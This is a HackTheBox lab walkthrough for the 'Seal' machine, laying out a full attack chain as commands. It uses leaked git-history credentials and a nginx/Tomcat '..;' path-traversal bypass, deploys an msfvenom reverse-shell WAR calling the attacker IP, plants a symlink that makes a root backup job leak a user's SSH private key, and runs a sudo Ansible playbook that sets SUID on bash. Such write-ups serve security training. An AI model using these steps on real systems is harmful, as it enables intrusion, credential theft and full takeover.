# Seal - HackTheBox Walkthrough

**Machine:** Seal  
**OS:** Linux  
**Difficulty:** Medium  
**IP:** `10.129.95.190`  
**Attacker IP:** `10.10.17.27`  

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [GitBucket - The Goldmine](#gitbucket---the-goldmine)
4. [Tomcat Manager Access via Path Traversal](#tomcat-manager-access-via-path-traversal)
5. [Foothold - WAR Reverse Shell](#foothold---war-reverse-shell)
6. [Lateral Movement to User (luis)](#lateral-movement-to-user-luis)
7. [Privilege Escalation to Root](#privilege-escalation-to-root)
8. [Flags](#flags)
9. [Hacker Mindset & Lessons Learned](#hacker-mindset--lessons-learned)

---

## Enumeration

### Step 1: Add target to /etc/hosts

```bash
echo "10.129.95.190 seal.htb" | sudo tee -a /etc/hosts
```

**Why this matters:** The SSL certificate on port 443 reveals the hostname `seal.htb`. Many web applications perform virtual host routing based on the `Host` header. Without this DNS mapping, we might miss important functionality or get redirected to invalid domains.

**Hacker Mindset:** *Always check SSL certificates.* They often contain domain names, organization info, and sometimes even email addresses that expand your attack surface. This is passive reconnaissance at its finest.

---

### Step 2: Service Discovery (Nmap)

```bash
nmap -sV -v -p- --min-rate=10000 10.129.95.190
```

**Results:**
- **Port 22/tcp** - OpenSSH 8.2p1 Ubuntu
- **Port 443/tcp** - nginx 1.18.0 (Ubuntu) - HTTPS
- **Port 8080/tcp** - GitBucket

**Hacker Mindset:** *Port 8080 is your friend.* When you see port 443 (standard HTTPS) alongside 8080, 8080 is almost always some kind of backend service, admin panel, or development tool. The combination of nginx + another HTTP service screams "reverse proxy" - and reverse proxies are notorious for path normalization bugs.

---

## Initial Reconnaissance

### Step 3: Explore Port 443 (The Main Website)

Visit `https://seal.htb` in the browser.

**What we see:** A vegetable market website called "Seal Market" - mostly static content.

**What we look for:**
- Search functionality (potential injection points)
- Contact forms (potential XSS or SSRF)
- Admin links or directories
- Technology stack indicators

**Key Findings:**
- `/admin` and `/manager` directories exist (found via directory fuzzing)
- `/manager/html` returns **403 Forbidden**
- `/admin/dashboard` is protected by mutual TLS authentication

**Hacker Mindset:** *When you see 403 Forbidden on `/manager` or `/admin`, don't give up.* A 403 means the resource EXISTS but you can't access it. This is fundamentally different from a 404. The server is telling you "there's something here, but I'm not letting you in." Your job is to find the bypass.

---

### Step 4: Explore Port 8080 (GitBucket)

Visit `http://seal.htb:8080`

**What we see:** GitBucket - a GitHub-like platform powered by Scala.

**Why this is huge:** Code repositories often contain:
- Hardcoded credentials
- Configuration files with passwords
- API keys
- Infrastructure definitions
- Commit history with sensitive data

**Hacker Mindset:** *Version control is a treasure trove.* Developers frequently commit credentials "temporarily" and forget to remove them. Even if they "fix" it in a later commit, the sensitive data remains in the commit history forever. Always check the full commit history, not just the latest files.

---

## GitBucket - The Goldmine

### Step 5: Register a GitBucket Account

Click **Register** and create any account (e.g., `testtest` / `password`).

**Why:** GitBucket allows self-registration. Once logged in, we can browse public repositories.

---

### Step 6: Discover Repositories

After logging in, we see two repositories under the `root` organization:
- `root/seal_market` - The main web application
- `root/infra` - Infrastructure configurations

**Hacker Mindset:** *Prioritize repositories based on names.* `seal_market` is clearly the main application. Infrastructure repos often contain deployment scripts, Docker files, and - most importantly - configuration files with credentials.

---

### Step 7: Analyze `seal_market` Repository

Navigate to `root/seal_market` → `tomcat/` directory.

**What we find:** `tomcat-users.xml` - the configuration file for Tomcat user authentication.

**Current version:** Contains no credentials (they were removed in the latest commit).

**Hacker Mindset:** *Always check commit history.* The current file might be clean, but developers often "remove" credentials by committing a new version without them. The old commit still exists in the repository's history.

---

### Step 8: Hunt Credentials in Commit History

Navigate to the file history of `tomcat-users.xml`.

**Commits found:**
1. `971f3aa` - "Updating tomcat configuration" (newer)
2. `ac21032` - "Adding tomcat configuration" (older)

Click the **older** commit (`ac21032`) to view the diff.

**JACKPOT:**
```xml
<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
```

**Why this works:** The developers added the configuration with credentials, then later "updated" it to remove the credentials. But Git preserves the entire history.

**Hacker Mindset:** *Think like a developer.* When you see "updating" a config file, ask yourself: "What was updated?" Often, "updates" are actually security fixes - which means the old version had a vulnerability (or credential) that you can exploit.

---

### Step 9: Verify Tomcat Manager Access

With credentials in hand, try accessing the Tomcat Manager:

```bash
curl -k -u 'tomcat:42MrHBf*z8{Z%' https://seal.htb/manager/html
```

**Result:** 403 Forbidden

**But wait!** We can access other endpoints:
- `https://seal.htb/manager/status` - Works (asks for auth, accepts credentials)
- `https://seal.htb/manager/jmxproxy` - Also works with auth

**Hacker Mindset:** *A 403 on one endpoint doesn't mean total failure.* Tomcat has multiple manager interfaces (`/html`, `/text`, `/jmxproxy`, `/status`). If one is blocked, test them all. The HTML interface (`/manager/html`) is the most powerful because it allows WAR deployment.

---

## Tomcat Manager Access via Path Traversal

### Step 10: The Nginx-Tomcat Path Normalization Bug

**The Core Vulnerability:**

nginx and Apache Tomcat normalize URLs differently:
- **nginx** normalizes `..` sequences before routing
- **Tomcat** does NOT normalize `..;` sequences the same way

This difference creates a **path traversal bypass** when nginx is used as a reverse proxy for Tomcat.

**Why this happens:**
- nginx sees `/manager/status/..;/html` and thinks: "`status/..` cancels out, leaving `/manager/html`"
- But Tomcat sees `/manager/status/..;/html` and interprets `..;` differently, routing to `/manager/html` while bypassing nginx's access controls

**Hacker Mindset:** *Understand your architecture.* When you see nginx + Tomcat, immediately think about path normalization differences. This is a well-known attack pattern. The Acunetix article on "Tomcat path traversal via reverse proxy mapping" documents this exact scenario.

**Hacker Mindset:** *Parsers are evil.* Every time two systems parse the same input differently, there's a potential vulnerability. URL parsing, path normalization, HTTP header parsing - these are all prime targets for bypasses.

---

### Step 11: Access the Manager via Bypass

**Browser:**
```
https://seal.htb/manager/status/..;/html
```

**Authentication:**
- Username: `tomcat`
- Password: `42MrHBf*z8{Z%`

**Result:** Full access to the Tomcat Web Application Manager!

**Alternative bypass paths that also work:**
```
https://seal.htb/manager/..;/html
https://seal.htb/manager/foo/..;/html
https://seal.htb/admin/foo/..;/dashboard/
```

**Hacker Mindset:** *When you find one bypass, keep fuzzing.* Different bypass variants might work for different operations (GET vs POST, upload vs listing). Having multiple bypass strings in your arsenal gives you flexibility.

---

## Foothold - WAR Reverse Shell

### Step 12: Generate a WAR Reverse Shell

On Kali:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.27 LPORT=4444 -f war -o shell.war
```

**Why a WAR file:** Tomcat's primary deployment format is WAR (Web Application Archive). The manager interface allows uploading WAR files, which Tomcat automatically deploys as running web applications.

**Hacker Mindset:** *Use the platform's native deployment mechanism.* Tomcat is designed to deploy WARs. Instead of trying to exploit a buffer overflow or SQL injection, we're simply using Tomcat's legitimate functionality - but with a malicious payload. This is much more reliable.

---

### Step 13: Start the Listener

On Kali:
```bash
nc -nlvp 4444
```

Leave this running in a separate terminal.

---

### Step 14: Deploy the WAR Shell

**The Challenge:** The upload form on the manager page submits to `/manager/html/upload`, which is blocked by nginx. We need to modify the form's action to use our bypass path.

**Method 1: Browser DevTools**
1. Go to `https://seal.htb/manager/status/..;/html`
2. Scroll to "WAR file to deploy"
3. Press **F12** → Inspector
4. Find the `<form>` tag for the WAR upload
5. Change `action="/manager/html/upload?CSRF_NONCE=..."` to `action="/manager/.;/html/upload?CSRF_NONCE=..."`
6. Select `shell.war`
7. Click **Deploy**

**Method 2: Burp Suite**
1. Intercept the upload request
2. Change the POST path from `/manager/html/upload` to `/manager/status/..;/html/upload`
3. Forward the request

**Method 3: curl (after obtaining a fresh CSRF nonce)**
```bash
curl -k -u 'tomcat:42MrHBf*z8{Z%' \
  'https://seal.htb/manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=YOUR_NONCE' \
  -F 'deployWar=@/home/kali/Downloads/seal/shell.war' \
  -F 'deployPath=/shell'
```

**Result:** The WAR deploys successfully. A new application `/shell` appears in the applications list.

**Hacker Mindset:** *CSRF protection is client-side theater.* The CSRF nonce is generated by the server and validated on submission - but it's tied to your authenticated session. As long as you have a valid session and include the nonce, the server accepts the request. The path traversal bypass works because nginx doesn't see the destination you're actually hitting.

---

### Step 15: Trigger the Shell

Visit `https://seal.htb/shell/` in the browser (or click the `/shell` application in the manager).

**On your Kali listener:**
```
connect to [10.10.17.27] from (UNKNOWN) [10.129.95.190] 44888
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

**Hacker Mindset:** *Trigger the payload.* Many people deploy shells but forget to trigger them. A WAR shell needs an HTTP request to execute the JSP payload. Simply visiting the application's root URL is enough.

---

### Step 16: Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Then press **Ctrl+Z** on Kali, run `stty raw -echo; fg`, and press Enter twice.

**Why stabilize:** A basic netcat shell has no job control, no tab completion, and no command history. A PTY shell is much easier to work with for complex enumeration.

---

## Lateral Movement to User (luis)

### Step 17: Initial Enumeration as `tomcat`

```bash
ls -la /home/
ps aux | grep -i backup
```

**Key Findings:**
- User `luis` exists
- A root process runs: `/bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml`
- `/opt/backups/archives/` contains `.gz` backup files

**Hacker Mindset:** *Processes reveal everything.* `ps aux` is one of the most powerful commands for privilege escalation. It shows you what's running, as whom, and with what arguments. A root process that runs `sudo -u luis ansible-playbook` is immediately suspicious - it's a privileged action being performed on behalf of a lower-privileged user.

---

### Step 18: Analyze the Ansible Playbook

```bash
cat /opt/backups/playbook/run.yml
```

**Content:**
```yaml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

**The Critical Detail:** `copy_links=yes`

**What `copy_links=yes` means:** The `synchronize` module (which uses rsync under the hood) will follow symbolic links and copy the TARGET of the symlink, not the symlink itself.

**Hacker Mindset:** *Read every configuration file carefully.* `copy_links=yes` is a security anti-pattern in backup scripts. It means: "If you put a symlink in the source directory, the backup will copy whatever the symlink points to." This is essentially an arbitrary file read vulnerability.

**Hacker Mindset:** *Symlinks are weapons.* In Linux, symlinks are one of the most powerful tools for privilege escalation and path traversal. When a privileged process follows symlinks, it often reads or writes files it shouldn't have access to.

---

### Step 19: Identify Writable Directories in the Backup Source

```bash
ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard
```

**Permissions:**
```
drwxr-xr-x 7 root root 4096 May  7  2021 .
drwxrwxrwx 2 root root 4096 May  7  2021 uploads
```

**Key Finding:** `uploads` is `drwxrwxrwx` - world-writable!

**Hacker Mindset:** *World-writable directories in backup scopes are gold.* If a privileged backup process copies a world-writable directory, and that process follows symlinks, you can make it read ANY file that the backup process's user can read.

---

### Step 20: Create the Symlink Trap

```bash
cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
ln -s /home/luis/.ssh luis-ssh
ls -la
```

**What this does:** Creates a symlink named `luis-ssh` pointing to `/home/luis/.ssh`. When the Ansible backup runs, `rsync` with `copy_links=yes` follows this symlink and copies luis's SSH private key into the backup archive.

**Hacker Mindset:** *Be patient.* The backup runs on a schedule (roughly every minute after a 30-second sleep). You can't rush the cron. Set up your trap and wait.

---

### Step 21: Wait for the Backup and Extract the Key

**Monitor for new backups:**
```bash
ls -la /opt/backups/archives/
```

When a new `.gz` file appears with a recent timestamp, copy and extract it:

```bash
cp /opt/backups/archives/backup-YYYY-MM-DD-HH:MM:SS.gz /tmp/backup.gz
cd /tmp
gunzip backup.gz
tar -xf backup
cat dashboard/uploads/luis-ssh/id_rsa
```

**Result:** Luis's SSH private key!

**Hacker Mindset:** *Timing is everything.* The uploads directory on this machine gets cleaned periodically (likely by the web application). You need to create the symlink and catch the backup before the cleaner removes it. If you miss the window, just recreate the symlink and try again.

---

### Step 22: SSH as `luis`

On Kali, save the key:
```bash
nano luis_id_rsa
# Paste the key
chmod 600 luis_id_rsa
ssh -i luis_id_rsa luis@seal.htb
```

**Verify access:**
```bash
whoami
# luis
cat /home/luis/user.txt
# abd4808[redacted]ee3469108
```

**Hacker Mindset:** *Keys are better than passwords.* SSH keys don't expire, aren't subject to password policies, and often grant access to multiple systems. Once you steal a private key, you own that identity until the key is rotated.

---

## Privilege Escalation to Root

### Step 23: Check sudo Permissions

```bash
sudo -l
```

**Output:**
```
User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

**Translation:** Luis can run **any** Ansible playbook as **root** without a password.

**Hacker Mindset:** `sudo -l` is the first command you run after gaining any user access. It's the fastest way to find the path to root. A wildcard (`*`) after a command in sudoers is almost always exploitable.

---

### Step 24: Exploit Ansible-Playbook for Root

**Why this works:** Ansible playbooks are YAML files that define tasks to be executed on target hosts. When run with `sudo`, those tasks execute as root. By creating a playbook that runs `chmod +s /bin/bash`, we grant ourselves a SUID root shell.

**Create the malicious playbook:**
```bash
cd /dev/shm
cat > root.yml << 'EOF'
- hosts: localhost
  tasks:
    - name: pwn
      command: chmod +s /bin/bash
EOF
```

**Execute it:**
```bash
sudo /usr/bin/ansible-playbook root.yml
```

**Result:**
```
TASK [pwn] ********************************************************************
changed: [localhost]
```

**Hacker Mindset:** *GTFOBins is your bible.* Ansible-playbook is listed on GTFOBins as a sudo exploitation vector. Whenever you see a command with `NOPASSWD` and a wildcard, check GTFOBins immediately.

---

### Step 25: Spawn Root Shell

```bash
/bin/bash -p
whoami
# root
cat /root/root.txt
# 3309f4d[redacted]92773a5a7
```

**Why `/bin/bash -p`:** The `-p` flag tells bash to run in privileged mode, preserving the effective user ID (EUID). Since we set the SUID bit on `/bin/bash`, running it with `-p` gives us a root shell.

**Hacker Mindset:** *SUID binaries are the classic Unix privilege escalation.* Setting the SUID bit on `/bin/bash` is the nuclear option - it gives you a permanent root shell that works even if your current session dies. Just remember: on a real penetration test, you should clean this up afterward.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/luis/user.txt` | `abd4808[redacted]469108` |
| Root | `/root/root.txt` | `3309f4[redacted]92773a5a7` |

---

## Hacker Mindset & Lessons Learned

### 1. The Value of Commit History
Developers are human. They commit credentials, API keys, and secrets. Even when they "fix" their mistake in a later commit, the sensitive data remains in the repository history forever. **Always check commit diffs and history.**

### 2. Reverse Proxies Are Dangerous
When nginx (or Apache, or CloudFlare) sits in front of an application server, the two systems must agree on how to parse URLs. When they disagree, you get bypasses. **Study path normalization differences.**

### 3. Configuration Files Are Exploitable
`copy_links=yes` in a backup script is a vulnerability. Any time a privileged process follows symlinks or expands wildcards in user-controlled directories, ask yourself: "Can I control what gets followed/expanded?"

### 4. Processes Don't Lie
`ps aux` reveals cron jobs, backup scripts, and periodic tasks that configuration files might not. A process running as root that touches user-writable directories is always worth investigating.

### 5. Wildcards in sudoers Are Wild
`(ALL) NOPASSWD: /usr/bin/ansible-playbook *` means you can run ANY playbook as root. The asterisk is the enemy of security. **Always check `sudo -l` first.**

### 6. Patience and Persistence
The backup trick failed multiple times because the uploads cleaner removed our symlink. We had to recreate it, wait for the exact backup window, and extract quickly. **Real hacking involves failure, iteration, and timing.**

### 7. SUID Is King
When you can't find a clean exploit, making a binary SUID is a reliable way to establish persistent root access. `/bin/bash -p` is the simplest, most reliable root shell technique on Linux.

---

## Tools Used

- `nmap` - Port scanning
- `msfvenom` - WAR payload generation
- `nc` - Reverse shell listener
- `curl` / Browser DevTools - WAR deployment
- `python3 pty` - Shell stabilization
- `ansible-playbook` - Root privilege escalation

---

*Happy Hacking!* 
